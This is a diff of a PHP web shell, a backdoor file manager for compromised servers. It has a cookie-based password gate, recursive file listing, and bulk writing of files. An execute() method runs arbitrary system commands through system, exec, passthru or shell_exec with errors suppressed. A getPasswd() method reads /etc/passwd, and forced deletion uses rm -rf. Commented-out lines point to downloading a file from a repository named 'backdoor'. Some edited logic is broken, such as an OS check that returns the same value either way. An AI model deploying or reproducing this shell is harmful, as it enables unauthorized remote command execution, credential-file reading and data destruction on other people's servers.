@@ -1,4 +1,5 @@
 <?php
+$auth = new auth('$2y$10$PfttDQnvDLNwYeJGF.m.c.Caf/IJ5Sxx3OWcS7ehne2ghgdec3Eka');
 class auth
 {
 	private $password;
@@ -17,8 +18,8 @@ class auth
 		$this->password = $password;
 		$this->cookie = $_COOKIE;
 		$this->post = $_POST;
-		return $this->login($this->password, $this->expired[3]);
 	}
+
 	public function displayLogin()
 	{
 		?>
@@ -28,16 +29,16 @@ class auth
 		<?php
 	}
 
-	public function login($password, $expired = 36000)
+	public function login()
 	{
-		if(isset($password) && (trim($password) != '')){
+		if(isset($this->password) && (trim($this->password) != '')){
 			if(isset($this->post['pass'])){
-				if (password_verify($this->post["pass"], $password)) {
-					setcookie("pass", $password, time()+$expired, "/");
+				if (password_verify($this->post["pass"], $this->password)) {
+					setcookie("pass", $this->password, time() + $this->expired[3], "/");
 					header("Location: {$_SERVER['PHP_SELF']}");
 				}
 			}
-			if(!isset($this->cookie['pass']) || ((isset($this->cookie['pass']) && ($this->cookie['pass'] != $password)))){
+			if(!isset($this->cookie['pass']) || ((isset($this->cookie['pass']) && ($this->cookie['pass'] != $this->password)))){
 				$this->displayLogin();
 				die();
 			}
@@ -58,6 +59,7 @@ class listFiles
 {
 	protected $path;
 	protected $result;
+	protected $getExtensionFiles;
 	
 	function __construct()
 	{
@@ -68,7 +70,9 @@ class listFiles
 	{
 		return $this->path;
 	}
-
+	/*
+	* @param: type(all|dir|file)
+	*/
 	public function list($type)
 	{
 		$this->result= [];
@@ -99,6 +103,11 @@ class listFiles
 		} return $this->result;
 	}
 
+	public function mySelf()
+	{
+		return str_replace("/", "", $_SERVER['PHP_SELF']);
+	}
+
 	public function folders()
 	{
 		return $this->list("dir");
@@ -109,17 +118,44 @@ class listFiles
 		return $this->list("file");
 	}
 
-	public function listAll($dir)
+	public function getExtension($filename)
+	{
+		return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+	}
+	/*
+	* @param: dir
+	* @param: array
+	*/
+	public function listAll($dir, &$output = array())
 	{
 		foreach (scandir($dir) as $key => $value) {
-			$path = $dir . DIRECTORY_SEPARATOR . $value;
-			if (!is_dir($path)) {
-				$this->result[] = $value;
-			} elseif ($value != '.' && $value != "..") {
-				$this->listAll($path);
-				$this->result[] = $value;
+			$location = $dir.DIRECTORY_SEPARATOR.$value;
+			if (!is_dir($location)) {
+				$output[] = $location;
+			} elseif ($value != "." && $value != '..') {
+				$this->listAll($location, $output);
+				$output[] = $location;
 			}
-		} return $this->result;
+		} return $output;
+	}
+	/*
+	* @param: dir
+	* @param: file extension
+	* @param: filename|filename
+	*/
+	public function listAllExtension($dir, $extension = null, $kecuali = "")
+	{
+		if (is_writable($dir)) {
+			foreach ($this->listAll($dir) as $key => $value) {
+				switch ($this->getExtension($value)) {
+					case $extension:
+						if (preg_match("/{$this->mySelf()}|{$kecuali}$/i", basename($value), $matches) === 0) {
+							print($value . "<br>");
+						}
+						break;
+				}
+			}
+		}
 	}
 }
 
@@ -144,8 +180,89 @@ class cd extends listFiles
 /**
  * 
  */
+class Tools
+{
+	protected $path, $name, $resource, $data = null, $cwd = null;
+	
+	function __construct()
+	{
+		$this->path = str_replace("\\", "/", getcwd());
+	}
 
-class Action
+	public function make($filename)
+	{
+		$this->resource = $filename;
+		return $this;
+	}
+
+	public function path($path)
+	{
+		$this->cwd = $path;
+		return $this;
+	}
+
+	public function dir()
+	{
+		return (!empty($this->resource)) ? mkdir($this->cwd . DIRECTORY_SEPARATOR . $this->resource) : false;
+	}
+
+	public function file($data)
+	{
+		foreach ($this->resource as $key => $value) {
+			$explode = explode("|", $this->resource[$key]);
+			foreach ($explode as $i => $file) {
+				file_put_contents($file, $data);
+			}
+		}
+	}
+
+	public function execute($command)
+	{
+		$command = $command;
+
+		switch ($command) {
+			case function_exists("system"):
+				@ob_start();
+				@system($command);
+				$buff = @ob_get_contents(); 
+				@ob_end_clean();
+				return $buff; 	
+				break;
+			
+			case function_exists("exec"):
+				@exec($command, $result);
+				$buff = "";
+				foreach ($result as $key => $value) {
+					$buff .= $value;
+				} return $buff;
+				break;
+
+			case function_exists("passthru"):
+				@ob_start();
+				@passthru($command);
+				$buff = @ob_get_contents();
+				@ob_end_clean();
+				return $buff;
+				break;
+
+			case function_exists("shell_exec"):
+				$buff = @shell_exec($command);
+				return $buff;
+				break;
+		}
+	}
+
+	public function getPasswd()
+	{
+		if ($this->OS() === "Linux") {
+			return $this->execute("cat /etc/passwd");
+		} else {
+			return false;
+		}
+	}
+}
+
+class Action extends Tools
 {
 	protected $path, $filename;
 	protected $handle;
@@ -189,9 +306,9 @@ class Action
 		}
 	}
 
-	public function OS()
+	public function isWIN(bool $bool)
 	{
-		return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
+		return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? $bool : $bool;
 	}
 
 	public function open($mode)
@@ -289,119 +406,11 @@ class Action
 	public function delete()
 	{
 		if (is_dir($this->filename)) {
-			if (!@rmdir($this->filename) AND $this->OS() === "Linux") $this->execute("rm -rf ".$this->filename."");
-			if (!@rmdir($this->filename) AND $this->OS() === "Windows") $this->execute("rmdir /s /q ".$this->filename."");
+			if (!@rmdir($this->filename) AND $this->isWIN(true)) $this->execute("rmdir /s /q {$this->filename}");
+			if (!@rmdir($this->filename) AND $this->isWIN(false)) $this->execute("rm -rf {$this->filename}");
 		} elseif (is_file($this->filename)) {
-			unlink($this->filename);
+			if (!@unlink($this->filename) AND $this->isWIN(true)) $this->execute("del /f {$this->filename}");
+			if (!@unlink($this->filename) AND $this->isWIN(false)) $this->execute("rm {$this->filename}");
 		}
 	}
 }
-
-class Tools extends Action
-{
-	protected $path, $name, $resource, $data = null, $cwd = null;
-	
-	function __construct()
-	{
-		$this->path = str_replace("\\", "/", getcwd());
-	}
-
-	public function make($filename)
-	{
-		$this->resource = $filename;
-		return $this;
-	}
-
-	public function path($path)
-	{
-		$this->cwd = $path;
-		return $this;
-	}
-
-	public function dir()
-	{
-		return (!empty($this->resource)) ? mkdir($this->cwd . DIRECTORY_SEPARATOR . $this->resource) : false;
-	}
-
-	public function file($data)
-	{
-		foreach ($this->resource as $key => $value) {
-			$explode = explode("|", $this->resource[$key]);
-			foreach ($explode as $i => $file) {
-				file_put_contents($file, $data);
-			}
-		}
-	}
-
-	public function execute($command)
-	{
-		$command = $command;
-
-		switch ($command) {
-			case function_exists("system"):
-				@ob_start();
-				@system($command);
-				$buff = @ob_get_contents(); 
-				@ob_end_clean();
-				return $buff; 	
-				break;
-			
-			case function_exists("exec"):
-				@exec($command, $result);
-				$buff = "";
-				foreach ($result as $key => $value) {
-					$buff .= $value;
-				} return $buff;
-				break;
-
-			case function_exists("passthru"):
-				@ob_start();
-				@passthru($command);
-				$buff = @ob_get_contents();
-				@ob_end_clean();
-				return $buff;
-				break;
-
-			case function_exists("shell_exec"):
-				$buff = @shell_exec($command);
-				return $buff;
-				break;
-		}
-	}
-
-	public function getPasswd()
-	{
-		if ($this->OS() === "Linux") {
-			return $this->execute("cat /etc/passwd");
-		} else {
-			return false;
-		}
-	}
-
-	/*public function Upload($files)
-	{
-		foreach ($files['error'] as $key => $value) {
-			if ($value === UPLOAD_ERR_OK) {
-				move_uploaded_file($value["tmp_name"][$key], $this->cwd . $value["name"][$key]);
-			}
-		}
-	}*/
-}
-
-// if (isset($_GET['cd'])) {
-// 	new cd($_GET['cd']);
-// }
-// // // $Action = new Action;
-// // // var_dump($Action->download("https://raw.githubusercontent.com/rabbitx1337/backdoor/main/FileSystem.php", "asw.php"));
-// // // die();
-
-// $list = new listFiles;
-
-// // foreach ($list->folder() as $key => $value) {
-// // 	print("<a href='?cd={$value['getPathname']}'>{$value['getName']}</a><br>");
-// // }
-// // foreach ($list->files() as $key => $value) {
-// // 	print($value['getName']."<br>");
-// // }
-// $Action = new Action;
-// var_dump($Action->getUser());
